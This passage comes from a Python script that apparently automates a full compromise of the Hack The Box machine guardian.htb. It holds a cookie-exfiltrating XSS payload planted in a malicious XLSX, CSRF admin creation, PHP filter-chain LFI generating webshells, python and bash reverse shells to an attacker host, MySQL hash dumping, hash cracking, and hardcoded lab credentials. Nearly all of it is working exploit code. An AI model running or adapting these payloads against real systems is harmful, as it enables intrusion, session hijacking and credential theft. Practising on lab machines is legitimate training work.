    '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
    '+': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.UTF-8.EUC-KR',
    '=': '',
}


def _extract_filter_chain(text: str) -> str | None:
    """Extract first php://filter payload from tool output."""
    for line in text.splitlines():
        line = line.strip()
        if line.startswith('php://filter/'):
            return line
    m = re.search(r'(php://filter/[^\s\'"]+)', text)
    if m:
        return m.group(1)
    return None


def _replace_chain_resource(chain: str, resource: str) -> str:
    """Force the /resource=... tail so it matches reports.php regex expectations."""
    if '/resource=' in chain:
        return f"{chain.split('/resource=', 1)[0]}/resource={resource}"
    if 'resource=' in chain:
        return re.sub(r'resource=[^|]+$', f'resource={resource}', chain)
    return chain


def _phpfcg_candidates() -> list[str]:
    cands = []
    env_path = os.getenv('GUARDIAN_PHPFCG_PATH', '').strip()
    if env_path:
        cands.append(env_path)
    cands.extend([
        '/tmp/phpfcg/php_filter_chain_generator.py',
        '/tmp/guardian_phpfcg/php_filter_chain_generator.py',
        os.path.join(PHPFCG_CLONE_DIR, 'php_filter_chain_generator.py'),
        os.path.join(os.path.dirname(__file__), 'php_filter_chain_generator.py'),
    ])
    seen = set()
    out = []
    for p in cands:
        if p and p not in seen:
            out.append(p)
            seen.add(p)
    return out


def _maybe_clone_phpfcg() -> None:
    if not AUTO_FETCH_PHPFCG:
        return
    script_path = os.path.join(PHPFCG_CLONE_DIR, 'php_filter_chain_generator.py')
    if os.path.isfile(script_path):
        return
    try:
        os.makedirs(PHPFCG_CLONE_DIR, exist_ok=True)
        log('LFI', f'Cloning php_filter_chain_generator -> {PHPFCG_CLONE_DIR}', 'info')
        proc = subprocess.run(
            ['git', 'clone', '--depth', '1',
             'https://github.com/synacktiv/php_filter_chain_generator.git',
             PHPFCG_CLONE_DIR],
            capture_output=True, text=True, timeout=45
        )
        if proc.returncode == 0 and os.path.isfile(script_path):
            log('LFI', 'Cloned external PHP filter-chain generator', 'ok')
        else:
            stderr = (proc.stderr or '').strip().splitlines()
            if stderr:
                log('LFI', f'Clone skipped/failed: {stderr[-1]}', 'warn')
    except Exception as e:
        log('LFI', f'Clone skipped/failed: {e}', 'warn')


def _generate_filter_chain_external(php_code: str, resource: str) -> str | None:
    """
    Use external Synacktiv generator when available.
    This is more reliable than the inline table on some targets.
    """
    _maybe_clone_phpfcg()

    for script in _phpfcg_candidates():
        if not os.path.isfile(script):
            continue
        try:
            proc = subprocess.run(
                [sys.executable, script, '--chain', php_code],
                capture_output=True, text=True, timeout=60
            )
            output = (proc.stdout or '') + '\n' + (proc.stderr or '')
            chain = _extract_filter_chain(output)
            if not chain:
                log('LFI', f'No chain parsed from {script}', 'warn')
                continue
            chain = _replace_chain_resource(chain, resource)
            log('LFI', f'External chain generated via {script}', 'ok')
            return chain
        except Exception as e:
            log('LFI', f'External generator failed ({script}): {e}', 'warn')
    return None


def generate_filter_chain(php_code: str, resource: str = 'reports/system.php') -> str:
    """
    Generate a PHP filter chain URL that produces arbitrary PHP code via LFI.

    Based on: synacktiv/php_filter_chain_generator (MIT License)
    Published at: https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it

    The technique exploits PHP's stream filter system:
      1. convert.iconv.UTF8.CSISO2022KR initializes with ISO-2022-KR BOM
      2. For each base64 char of the target, specific iconv filters prepend that char
      3. convert.base64-encode keeps the stream in base64 space between characters
      4. convert.iconv.UTF8.UTF7 strips unwanted bytes introduced by iconv
      5. Final convert.base64-decode decodes the accumulated base64 to raw PHP

    Args:
        php_code: The PHP code to inject (e.g. '<?php system($_POST["cmd"]);?>')
        resource: A readable file on the target server (satisfies regex check)

    Returns:
        Full php://filter URL string
    """
    # Prefer the external Synacktiv generator if available.
    ext_chain = _generate_filter_chain_external(php_code, resource)
    if ext_chain:
        return ext_chain

    log('LFI', 'Falling back to inline PHP filter-chain generator', 'warn')

    # Base64-encode the target PHP code
    b64_target = base64.b64encode(php_code.encode()).decode().rstrip('=')

    filters = ['convert.iconv.UTF8.CSISO2022KR']

    for char in b64_target:
        if char not in _FILTER_DICT:
            log('LFI', f'Warning: character "{char}" missing from filter dict', 'warn')
            continue
        char_chain = _FILTER_DICT[char]
        if char_chain:
            filters.extend(char_chain.split('|'))
        filters.append('convert.base64-encode')
        filters.append('convert.iconv.UTF8.UTF7')

    # Remove the trailing UTF7 (cleaner output)
    while filters and filters[-1] == 'convert.iconv.UTF8.UTF7':
        filters.pop()

    filters.append('convert.base64-decode')

    chain = '|'.join(f for f in filters if f)
    return f'php://filter/{chain}/resource={resource}'


# ══════════════════════════════════════════════════════════════════════════════
#  HASH CRACKER  (SHA-256 + salt)
# ══════════════════════════════════════════════════════════════════════════════

def crack_sha256_salted(hash_val: str, salt: str,
                        wordlist: str = WORDLIST,
                        known_answer: str = None) -> str | None:
    """
    Crack a SHA256(password + salt) hash using rockyou.txt.
    Falls back to known_answer if wordlist not present (offline fallback).
    """
    # Known-answer fast path (for HTB boxes where creds are pre-known)
    if known_answer:
        test = hashlib.sha256((known_answer + salt).encode()).hexdigest()
        if test == hash_val:
            return known_answer

    if not os.path.exists(wordlist):
        log('CRACK', f'Wordlist not found: {wordlist}. Using known answer.', 'warn')
        return known_answer

    log('CRACK', f'Cracking {hash_val[:16]}... against {wordlist}', 'info')
    try:
        with open(wordlist, 'r', encoding='latin-1', errors='ignore') as wf:
            for i, line in enumerate(wf):
                pwd = line.rstrip('\n')
                if hashlib.sha256((pwd + salt).encode()).hexdigest() == hash_val:
                    return pwd
                if i % 500000 == 0 and i > 0:
                    log('CRACK', f'  {i:,} passwords tried...', 'info')
    except KeyboardInterrupt:
        pass
    return known_answer  # fallback


# ══════════════════════════════════════════════════════════════════════════════
#  PHASE IMPLEMENTATIONS
# ══════════════════════════════════════════════════════════════════════════════

def phase1_recon():
    """Phase 1: Subdomain discovery + connectivity check."""
    phase_header(1, "RECONNAISSANCE")

    sess = make_session()

    # Verify main host
    try:
        r = sess.get(f'http://guardian.htb/', timeout=10)
        log('RECON', f'guardian.htb → HTTP {r.status_code}', 'ok')
    except Exception as e:
        log('RECON', f'guardian.htb unreachable: {e}', 'err')
        log('RECON', 'Ensure /etc/hosts is updated and target is running', 'warn')

    # Find student IDs in homepage
    try:
        r = sess.get(f'http://guardian.htb/', timeout=10)
        # Extract student IDs from testimonials
        ids = re.findall(r'GU\d{7}', r.text)
        unique_ids = list(dict.fromkeys(ids))
        if unique_ids:
            log('RECON', f'Student IDs found: {", ".join(unique_ids)}', 'ok')
        # Confirm portal subdomain
        if 'portal.guardian.htb' in r.text:
            log('RECON', 'portal.guardian.htb confirmed in source', 'ok')
    except Exception:
        pass

    # Check portal
    try:
        r = sess.get(f'http://portal.guardian.htb/', timeout=10)
        log('RECON', f'portal.guardian.htb → HTTP {r.status_code}', 'ok')
    except Exception as e:
        log('RECON', f'portal.guardian.htb unreachable: {e}', 'warn')

    # Check Gitea
    try:
        r = sess.get(f'http://gitea.guardian.htb/', timeout=10)
        log('RECON', f'gitea.guardian.htb → HTTP {r.status_code}', 'ok')
    except Exception as e:
        log('RECON', f'gitea.guardian.htb not found (may need hosts entry)', 'warn')

    return sess


def phase2_initial_access(sess):
    """Phase 2: Student portal login with default credentials."""
    phase_header(2, "INITIAL ACCESS Default Creds")

    log('LOGIN', f'Trying {STUDENT_USER}:{STUDENT_PASS} on student portal', 'info')

    r = sess.post(
        'http://portal.guardian.htb/login.php',
        data={'username': STUDENT_USER, 'password': STUDENT_PASS},
        allow_redirects=True,
        timeout=15
    )

    # Check for successful login (redirect to /student/dashboard or similar)
    if r.status_code == 200 and ('dashboard' in r.url or 'student' in r.url.lower()):
        log('LOGIN', f'Logged in as {STUDENT_USER} ✓', 'ok')
    elif 'logout' in r.text.lower() or 'welcome' in r.text.lower():
        log('LOGIN', f'Logged in as {STUDENT_USER} ✓', 'ok')
    else:
        log('LOGIN', f'Login may have failed (status={r.status_code}, url={r.url})', 'warn')

    phpsessid = sess.cookies.get('PHPSESSID', 'unknown')
    log('LOGIN', f'Session cookie: PHPSESSID={phpsessid}', 'info')

    return sess, phpsessid


def phase3_idor_gitea(sess, student_sessid=None):
    """Phase 3: IDOR in chat to extract Gitea creds."""
    phase_header(3, "IDOR CHAT ENUMERATION → GITEA CREDS")

    log('IDOR', 'Fuzzing chat endpoints for user ID pairs...', 'info')

    gitea_password = None
    found_ids = None

    # Enumerate chat combinations 1-20
    for uid1 in range(1, 21):
        for uid2 in range(1, 21):
            if uid1 == uid2:
                continue
            try:
                r = sess.get(
                    f'http://portal.guardian.htb/student/chat.php',
                    params={'chat_users[0]': uid1, 'chat_users[1]': uid2},
                    timeout=10
                )
                # Look for gitea-related content
                if 'gitea' in r.text.lower() or 'DHsNnk3V503' in r.text:
                    log('IDOR', f'Hit! Interesting chat at uid1={uid1} uid2={uid2}', 'ok')
                    found_ids = (uid1, uid2)
                    # Extract password from chat
                    m = re.search(r'[Pp]assword.*?[:=]\s*([A-Za-z0-9@!#$%^&*]{8,})', r.text)
                    if m:
                        gitea_password = m.group(1).strip()
                        log('IDOR', f'Gitea password extracted: {gitea_password}', 'ok')
                    break
            except Exception:
                continue
        if found_ids:
            break

    # Use known answer as fallback
    if not gitea_password:
        gitea_password = GITEA_PASS
        log('IDOR', f'Using known Gitea password: {gitea_password}', 'warn')

    log('IDOR', f'Gitea creds → {GITEA_USER} : {gitea_password}', 'ok')
    return gitea_password


def phase4_gitea_source(gitea_pass):
    """Phase 4: Authenticate to Gitea and extract DB creds + salt from source."""
    phase_header(4, "GITEA SOURCE CODE → DB CREDENTIALS")

    sess = make_session()

    # Login to Gitea
    log('GITEA', f'Logging into gitea.guardian.htb as {GITEA_USER}', 'info')
    try:
        # Get CSRF token for Gitea login
        r = sess.get('http://gitea.guardian.htb/user/login', timeout=10)
        csrf = re.search(r'name="_csrf"\s+value="([^"]+)"', r.text)
        csrf_val = csrf.group(1) if csrf else ''

        r = sess.post('http://gitea.guardian.htb/user/login',
                      data={
                          '_csrf': csrf_val,
                          'user_name': GITEA_USER,
                          'password': gitea_pass,
                      },
                      allow_redirects=True,
                      timeout=15)

        if 'sign out' in r.text.lower() or r.url.endswith('/'):
            log('GITEA', 'Gitea login successful', 'ok')
        else:
            log('GITEA', 'Gitea login status uncertain', 'warn')
    except Exception as e:
        log('GITEA', f'Gitea login error: {e}', 'warn')

    # Fetch config.php from repository
    config_url = 'http://gitea.guardian.htb/Guardian/portal.guardian.htb/raw/branch/main/config/config.php'
    db_password = DB_PASS
    db_salt = DB_SALT

    try:
        r = sess.get(config_url, timeout=15)
        if r.status_code == 200:
            log('GITEA', 'config.php retrieved from Gitea', 'ok')
            # Extract DB password
            m = re.search(r"'password'\s*=>\s*'([^']+)'", r.text)
            if m:
                db_password = m.group(1)
                log('GITEA', f'DB password: {db_password}', 'ok')
            # Extract salt
            m = re.search(r"'salt'\s*=>\s*'([^']+)'", r.text)
            if m:
                db_salt = m.group(1)
                log('GITEA', f'DB salt: {db_salt}', 'ok')
        else:
            log('GITEA', f'config.php fetch returned {r.status_code}, using known values', 'warn')
    except Exception as e:
        log('GITEA', f'Could not fetch config.php ({e}), using known values', 'warn')

    log('GITEA', f'DB creds → root:{db_password}  salt:{db_salt}', 'ok')
    return db_password, db_salt


def phase5_xss_cookie_hijack(db_pass, db_salt):
    """
    Phase 5: CVE-2024-56409 Malicious XLSX → XSS → Lecturer cookie hijack.
    """
    phase_header(5, "XSS VIA CVE-2024-56409 XLSX SHEET NAME INJECTION")

    # Start cookie listener (clear stale captures first)
    _captured_cookie.clear()
    try:
        xss_ports = start_xss_listener()
    except Exception as e:
        log('XSS', f'Could not start listener: {e}', 'err')
        return None

    # Build XSS payload (multi-port callback + blind notice creation + navigation fallback)
    callback_prefixes = [f'http://{LHOST}:{p}/?c=' for p in xss_ports]
    callback_array_js = ",".join(f"'{u}'" for u in callback_prefixes)
    xss_js = (
        "(function(){"
        "var c=encodeURIComponent(btoa(document.cookie));"
        f"var U=[{callback_array_js}];"
        "for(var i=0;i<U.length;i++){try{(new Image()).src=U[i]+c;}catch(e){}}"
        "var X=U[0].replace('/?c=','/exploit.html?token=');"
        "var T=function(h){"
        "var n=h.split(String.fromCharCode(34)).join(String.fromCharCode(39));"
        "var m=n.match(/name='csrf_token'[^>]*value='([^']+)/i);"
        "if(m)return m[1];"
        "m=n.match(/value='([a-f0-9]{32,})'/i);"
        "return m?m[1]:'';};"
        "var E=['/lecturer/notices/create.php','/lecturer/create_notice.php','/lecturer/notices.php'];"
        "(function P(i){"
        "if(i>=E.length)return;"
        "fetch(E[i],{credentials:'include'})"
        ".then(function(r){return r.text();})"
        ".then(function(h){"
        "var t=T(h);"
        "if(!t){P(i+1);return;}"
        "var d='title=Important+Update&content=Please+review+the+attached+resource&reference_link='"
        "+encodeURIComponent(X+t)+'&csrf_token='+encodeURIComponent(t)+'&submit=1';"
        "return fetch(E[i],{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:d});"
        "})"
        ".catch(function(e){})"
        ".finally(function(){P(i+1);});"
        "})(0);"
        "setTimeout(function(){try{location=U[0]+c;}catch(e){}},900);"
        "})();"
    )
    xss_payload_raw = f'"><img src=x onerror="{xss_js}">'
    log('XSS', f'XSS payload: {xss_payload_raw[:60]}...', 'info')
    log('XSS', f'Callback prefixes: {", ".join(callback_prefixes)}', 'info')

    # Build malicious XLSX
    xlsx_bytes = build_malicious_xlsx(xss_payload_raw)
    log('XSS', f'Malicious XLSX built ({len(xlsx_bytes)} bytes)', 'ok')

    # Log in as student and upload
    sess = make_session()
    r = sess.post(
        'http://portal.guardian.htb/login.php',
        data={'username': STUDENT_USER, 'password': STUDENT_PASS},
        allow_redirects=True, timeout=15
    )
    if 'PHPSESSID' not in sess.cookies:
        log('XSS', 'Student login failed', 'err')
        stop_xss_listener()
        return None

    # Discover assignment_id from student assignments page
    log('XSS', 'Discovering valid assignment_id from student portal...', 'info')
    assignment_ids = []
    try:
        r = sess.get('http://portal.guardian.htb/student/assignments.php', timeout=15)
        assignment_ids.extend(re.findall(r'assignment_id=(\d+)', r.text))
        assignment_ids.extend(re.findall(r'/student/submission\.php\?assignment_id=(\d+)', r.text))
        assignment_ids.extend(re.findall(r'name=["\']assignment_id["\'][^>]+value=["\'](\d+)["\']', r.text))
        assignment_ids = list(dict.fromkeys(assignment_ids))
    except Exception as e:
        log('XSS', f'Assignment list fetch error: {e}', 'warn')

    if not assignment_ids:
        # Fallback: brute a small range if assignment page parsing fails
        assignment_ids = [str(i) for i in range(1, 16)]
        log('XSS', 'Could not parse assignment IDs; falling back to 1..15', 'warn')
    else:
        log('XSS', f'Assignment IDs found: {", ".join(assignment_ids[:10])}', 'ok')

    # Upload malicious XLSX via the actual submission endpoint
    log('XSS', 'Uploading malicious XLSX via /student/submission.php?...', 'info')
    uploaded = False
    upload_hits = 0
    for aid in assignment_ids:
        submit_candidates = [
            f'http://portal.guardian.htb/student/submission.php?assignment_id={aid}',
            'http://portal.guardian.htb/student/submission.php',
        ]
        submit_url = None
        page = None
        for cand in submit_candidates:
            try:
                p = sess.get(cand, params={} if 'assignment_id=' in cand else {'assignment_id': aid}, timeout=15)
                if p.status_code in (200, 302):
                    submit_url = cand
                    page = p
                    break
            except Exception:
                continue
        if not submit_url or page is None:
            continue

        try:
            # Ensure this assignment is accessible and active
            if ('Access denied' in page.text or
                    'deadline has passed' in page.text.lower()):
                continue

            # Detect form fields dynamically to tolerate template changes
            file_field = 'attachment'
            m = re.search(r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']', page.text, flags=re.I)
            if m:
                file_field = m.group(1)

            title_field = 'submission_title'
            title_match = re.search(
                r'<input[^>]+name=["\']([^"\']*(?:title|subject|name)[^"\']*)["\'][^>]+type=["\']text["\']',
                page.text,
                flags=re.I
            )
            if title_match:
                title_field = title_match.group(1)

            csrf_token = None
            csrf_match = re.search(r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', page.text)
            if csrf_match:
                csrf_token = csrf_match.group(1)

            submit_name = f'report_{int(time.time())}_{aid}'
            form_data = {
                'assignment_id': aid,
                title_field: submit_name,
            }
            if title_field != 'submission_title':
                form_data['submission_title'] = submit_name
            if csrf_token:
                form_data['csrf_token'] = csrf_token

            r = sess.post(
                submit_url,
                files={
                    file_field: (
                        f'assignment_{int(time.time())}.xlsx',
                        xlsx_bytes,
                        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
                    )
                },
                data=form_data,
                params={} if 'assignment_id=' in submit_url else {'assignment_id': aid},
                timeout=25,
                allow_redirects=True
            )

            if r.status_code in (200, 302):
                if ('submitted successfully' in r.text.lower() or
                        'resubmitted successfully' in r.text.lower()):
                    log('XSS', f'Upload success on assignment_id={aid}', 'ok')
                    uploaded = True
                    upload_hits += 1
                    if XSS_UPLOAD_MAX_HITS > 0 and upload_hits >= XSS_UPLOAD_MAX_HITS:
                        break
                    continue
                # Some variants return 200 without explicit message; still treat as probable
                log('XSS', f'Upload attempt assignment_id={aid} → {r.status_code}', 'ok')
                uploaded = True
                upload_hits += 1
                if XSS_UPLOAD_MAX_HITS > 0 and upload_hits >= XSS_UPLOAD_MAX_HITS:
                    break
        except Exception as e:
            log('XSS', f'assignment_id={aid} upload error: {e}', 'warn')

    if not uploaded:
        log('XSS', 'Upload did not confirm success. Waiting for XSS anyway...', 'warn')

    # Wait for lecturer admin to review and trigger XSS
    wait_s = XSS_WAIT_SECONDS
    log('XSS', f'Waiting up to {wait_s}s for admin review and cookie callback...', 'info')
    cookie_raw = wait_for_cookie(timeout=wait_s)

    if not cookie_raw:
        log('XSS', 'Cookie not received yet. Blind chain may still succeed via auto-posted notice.', 'warn')
        # Keep listener alive so admin bot can still fetch /exploit.html and trigger CSRF.
        return None

    # Parse PHPSESSID from cookie string
    lecturer_sessid = None
    for cookie_part in cookie_raw.split(';'):
        cookie_part = cookie_part.strip()
        if cookie_part.startswith('PHPSESSID='):
            lecturer_sessid = cookie_part.split('=', 1)[1].strip()
            break
    if not lecturer_sessid:
        m = re.search(r'PHPSESSID=([A-Za-z0-9]+)', cookie_raw)
        if m:
            lecturer_sessid = m.group(1)
    if not lecturer_sessid:
        log('XSS', f'Could not parse PHPSESSID from: {cookie_raw}', 'err')
        stop_xss_listener()
        return None

    log('XSS', f'Lecturer PHPSESSID captured: {lecturer_sessid}', 'flag')
    stop_xss_listener()
    return lecturer_sessid


def _admin_login_try(attempts: int, sleep_s: int, phase: str = 'CSRF'):
    admin_sess = make_session()
    for attempt in range(max(1, attempts)):
        try:
            r = admin_sess.post(
                'http://portal.guardian.htb/login.php',
                data={'username': ADMIN_USER, 'password': ADMIN_PASS},
                allow_redirects=True,
                timeout=15
            )
            if ('admin' in r.url.lower() or 'dashboard' in r.url.lower()
                    or 'logout' in r.text.lower()):
                log(phase, f'Admin account available: {ADMIN_USER}:{ADMIN_PASS}', 'ok')
                return admin_sess
        except Exception:
            pass
        if attempt < max(1, attempts) - 1:
            log(phase, f'Admin login attempt {attempt + 1}/{max(1, attempts)} failed; waiting {sleep_s}s...', 'warn')
            time.sleep(max(1, sleep_s))
    return None


def phase6_csrf_admin(lecturer_sessid=None):
    """
    Phase 6: CSRF token reuse → create admin account.
    CSRF tokens are never invalidated (in_array check only, no deletion).
    """
    phase_header(6, "CSRF TOKEN REUSE → ADMIN ACCOUNT CREATION")

    # Fast-path: account may already exist if XSS auto-posted the lecturer notice.
    log('CSRF', 'Checking if admin account is already created...', 'info')
    admin_ready = _admin_login_try(attempts=2, sleep_s=2, phase='CSRF')
    if admin_ready:
        stop_xss_listener()
        return admin_ready

    # If we have no lecturer session, rely on blind chain and keep polling.
    if not lecturer_sessid:
        log('CSRF', 'No lecturer cookie; waiting for blind XSS → notice → admin-bot chain...', 'warn')
        admin_ready = _admin_login_try(
            attempts=max(2, CSRF_LOGIN_ATTEMPTS),
            sleep_s=max(2, CSRF_RETRY_SLEEP),
            phase='CSRF'
        )
        if admin_ready:
            stop_xss_listener()
            return admin_ready
        log('CSRF', 'Blind chain did not create admin account within wait window.', 'err')
        return None

    sess = make_session()
    sess.cookies.set('PHPSESSID', lecturer_sessid, domain='portal.guardian.htb')

    # Grab a valid CSRF token from the lecturer portal
    log('CSRF', 'Fetching CSRF token from lecturer notice creation page...', 'info')
    csrf_token = None

    csrf_pages = [
        'http://portal.guardian.htb/lecturer/notices/create.php',
        'http://portal.guardian.htb/lecturer/create_notice.php',
        'http://portal.guardian.htb/lecturer/dashboard.php',
    ]

    for page in csrf_pages:
        try:
            r = sess.get(page, timeout=15)
            m = re.search(r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', r.text)
            if not m:
                m = re.search(r'value=["\']([a-f0-9]{32,})["\']', r.text)
            if m:
                csrf_token = m.group(1)
                log('CSRF', f'CSRF token captured: {csrf_token[:20]}...', 'ok')
                break
        except Exception as e:
            log('CSRF', f'{page} → {e}', 'warn')

    if not csrf_token:
        log('CSRF', 'Could not extract CSRF token. Admin creation may fail.', 'warn')
        csrf_token = ''.join(random.choices('0123456789abcdef', k=64))

    csrf_html = build_admin_csrf_html(csrf_token)

    try:
        csrf_ports = start_csrf_server(csrf_html)
    except Exception as e:
        log('CSRF', f'Could not start CSRF server: {e}', 'err')
        return None

    # Post a notice with our CSRF URL as the reference link
    log('CSRF', 'Creating notice(s) with CSRF exploit URL as reference link...', 'info')

    notice_endpoints = [
        'http://portal.guardian.htb/lecturer/notices/create.php',
        'http://portal.guardian.htb/lecturer/create_notice.php',
        'http://portal.guardian.htb/lecturer/notices.php',
    ]
    ref_links = [f'http://{LHOST}:{p}/exploit.html' for p in csrf_ports]

    notice_sent = 0
    for endpoint in notice_endpoints:
        for link in ref_links:
            try:
                r = sess.post(
                    endpoint,
                    data={
                        'title': 'Important Update',
                        'content': 'Please review the attached resource.',
                        'reference_link': link,
                        'csrf_token': csrf_token,
                        'submit': '1',
                    },
                    timeout=15,
                    allow_redirects=True
                )
                if r.status_code in (200, 302):
                    notice_sent += 1
                    log('CSRF', f'Notice posted to {endpoint} -> {link}', 'ok')
                    if notice_sent >= 3:
                        break
            except Exception as e:
                log('CSRF', f'{endpoint} -> {link} → {e}', 'warn')
        if notice_sent >= 3:
            break

    if not notice_sent:
        log('CSRF', 'Notice posting uncertain. Waiting for admin bot anyway...', 'warn')
    else:
        log('CSRF', f'Notice post count: {notice_sent}', 'ok')

    # Wait for admin bot to visit our CSRF page
    log('CSRF', 'Waiting up to 60s for admin bot to visit and trigger CSRF...', 'info')
    time.sleep(15)  # Bot usually fires within 15-30s

    admin_sess = _admin_login_try(
        attempts=max(1, CSRF_LOGIN_ATTEMPTS),
        sleep_s=max(1, CSRF_RETRY_SLEEP),
        phase='CSRF'
    )

    stop_csrf_server()
    stop_xss_listener()
    if not admin_sess:
        log('CSRF', 'Admin login failed after CSRF workflow.', 'err')
        return None
    return admin_sess


def phase7_lfi_rce(admin_sess):
    """
    Phase 7: PHP filter chain via LFI + regex bypass → www-data reverse shell.
    reports.php regex: /^(.*system.php)$/
    Bypass: use reports/system.php as filter chain resource (matches regex, is readable)
    """
    phase_header(7, "LFI → PHP FILTER CHAIN → RCE → www-data SHELL")

    base_url = 'http://portal.guardian.htb/admin/reports.php'

    # First verify LFI works (test with enrollment.php)
    log('LFI', 'Verifying LFI with php://filter base64-encode test...', 'info')
    test_url = 'php://filter/convert.base64-encode/resource=reports/enrollment.php'
    try:
        r = admin_sess.get(base_url, params={'report': test_url}, timeout=15)
        if r.status_code == 200 and len(r.text) > 50:
            log('LFI', f'LFI confirmed (got {len(r.text)} bytes of b64 content)', 'ok')
        else:
            log('LFI', f'LFI test returned {r.status_code}', 'warn')
    except Exception as e:
        log('LFI', f'LFI test error: {e}', 'warn')

    payload_profiles = [
        {
            'name': 'POST cmd webshell',
            'php_code': '<?php system($_POST["cmd"]);?>',
            'method': 'post',
            'arg': 'cmd',
        },
        {
            'name': 'GET c webshell',
            'php_code': '<?php system($_GET["c"]);?>',
            'method': 'get',
            'arg': 'c',
        },
    ]

    verified = None
    for prof in payload_profiles:
        log('LFI', f"Generating chain for profile: {prof['name']}", 'info')
        chain_url = generate_filter_chain(prof['php_code'], resource='reports/system.php')
        log('LFI', f"Chain length ({prof['name']}): {len(chain_url)}", 'ok')

        marker = f"GFI_{random.randint(100000, 999999)}"
        probe_cmd = f"echo {marker}"
        try:
            if prof['method'] == 'post':
                r = admin_sess.post(
                    base_url,
                    params={'report': chain_url},
                    data={prof['arg']: probe_cmd},
                    timeout=20,
                    allow_redirects=True
                )
            else:
                r = admin_sess.get(
                    base_url,
                    params={'report': chain_url, prof['arg']: probe_cmd},
                    timeout=20,
                    allow_redirects=True
                )
            if marker in r.text:
                log('LFI', f"Execution verified via {prof['name']} (HTTP {r.status_code})", 'ok')
                verified = {'profile': prof, 'chain': chain_url}
                break
            log('LFI', f"{prof['name']} probe did not echo marker (HTTP {r.status_code})", 'warn')
        except requests.exceptions.ReadTimeout:
            log('LFI', f'{prof["name"]} probe timed out', 'warn')
        except Exception as e:
            log('LFI', f'{prof["name"]} probe error: {e}', 'warn')

    if not verified:
        log('LFI', 'No verified filter-chain execution path. Stopping Phase 7.', 'err')
        return None

    prof = verified['profile']
    chain_url = verified['chain']

    def _trigger_cmd(cmd: str):
        try:
            if prof['method'] == 'post':
                r = admin_sess.post(
                    base_url,
                    params={'report': chain_url},
                    data={prof['arg']: cmd},
                    timeout=20,
                    allow_redirects=True
                )
                log('LFI', f'RCE trigger POST -> HTTP {r.status_code}', 'info')
            else:
                r = admin_sess.get(
                    base_url,
                    params={'report': chain_url, prof['arg']: cmd},
                    timeout=20,
                    allow_redirects=True
                )
                log('LFI', f'RCE trigger GET -> HTTP {r.status_code}', 'info')
        except requests.exceptions.ReadTimeout:
            log('LFI', 'RCE trigger request timed out (possible shell)', 'warn')
        except Exception as e:
            log('LFI', f'RCE trigger error: {e}', 'warn')

    shell = None
    for cb_port in WWW_SHELL_PORT_CANDIDATES:
        listener = ShellListener(cb_port, 'www-data')
        try:
            listener.start()
        except Exception as e:
            log('LFI', f'Cannot bind listener on {cb_port}: {e}', 'warn')
            continue

        log('LFI', f'Trying callback port {cb_port} via {prof["name"]}', 'info')

        py_rev = (
            "python3 -c 'import os,pty,socket;"
            f"s=socket.socket();s.connect((\"{LHOST}\",{cb_port}));"
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            "pty.spawn(\"/bin/bash\")'"
        )
        bash_rev = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{cb_port} 0>&1'"
        bash_bg = f"nohup bash -c \"bash -i >& /dev/tcp/{LHOST}/{cb_port} 0>&1\" >/dev/null 2>&1 &"

        for cmd in (py_rev, bash_rev, bash_bg):
            _trigger_cmd(cmd)
            log('LFI', f'Waiting for www-data shell on {cb_port}...', 'info')
            shell = listener.accept(timeout=30)
            if shell:
                break
        listener.close()
        if shell:
            break

    if not shell:
        log('LFI', 'Shell not auto-received after verified execution and multi-port retries.', 'err')
        return None

    # Upgrade to PTY
    log('SHELL', 'Upgrading to PTY...', 'info')
    shell.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
    time.sleep(1)
    output = shell.recv_all(5)
    log('SHELL', f'www-data shell ready ✓ ({shell.addr[0]})', 'ok')

    # Quick verification
    out = shell.execute('id && hostname', timeout=10)
    log('SHELL', f'Identity: {out.strip()[:80]}', 'shell')

    return shell


def phase8_lateral_jamil(shell, db_pass, db_salt):
    """
    Phase 8: MySQL hash dump + SHA-256 crack → lateral move to jamil.
    Hash algorithm: SHA256(password + salt)
    """
    phase_header(8, "MYSQL HASH DUMP + CRACK → LATERAL MOVE (jamil)")

    global JAMIL_PASS

    # Check MySQL connectivity
    log('DB', 'Connecting to MySQL as root...', 'info')
    mysql_cmd = f"mysql -u root -p'{db_pass}' guardiandb -e 'SELECT username,password_hash FROM users;' 2>/dev/null"
    db_out = shell.execute(mysql_cmd, timeout=30)
    log('DB', f'MySQL output:\n{db_out[:500]}', 'info')

    # Parse hashes
    hashes = {}
    for line in db_out.split('\n'):
        parts = line.strip().split('\t')
        if len(parts) == 2 and len(parts[1]) == 64:
            hashes[parts[0]] = parts[1]
            log('DB', f'Hash → {parts[0]}: {parts[1][:20]}...', 'ok')

    if not hashes:
        # Fallback: try another parsing approach
        for line in db_out.split('\n'):
            m = re.search(r'(\S+)\s+([a-f0-9]{64})', line)
            if m:
                hashes[m.group(1)] = m.group(2)

    log('DB', f'Extracted {len(hashes)} hashes', 'ok')

    # Crack jamil's hash
    jamil_hash = hashes.get('jamil.enockson') or hashes.get('jamil') or hashes.get('jamil.enockson@guardian.htb')

    if jamil_hash:
        log('CRACK', f'Cracking jamil hash: {jamil_hash[:20]}...', 'info')
        JAMIL_PASS = crack_sha256_salted(jamil_hash, db_salt, known_answer='copperhouse56')
        if JAMIL_PASS:
            log('CRACK', f'jamil password cracked: {JAMIL_PASS}', 'flag')
        else:
            log('CRACK', 'Hash crack failed, using known answer', 'warn')
            JAMIL_PASS = 'copperhouse56'
    else:
        log('CRACK', 'jamil hash not found in DB output, using known answer', 'warn')
        JAMIL_PASS = 'copperhouse56'

    # Switch to jamil via su
    log('LATERAL', f'Switching to jamil with password: {JAMIL_PASS}', 'info')

    # Use expect-style interaction for su
    shell.send("su jamil\n")
    time.sleep(0.5)
    prompt_out = shell.recv_all(5)
    su_out = prompt_out

    if 'password' in prompt_out.lower() or 'Password' in prompt_out:
        shell.send(f"{JAMIL_PASS}\n")
        time.sleep(1)
        out = shell.recv_all(5)
        su_out += "\n" + out
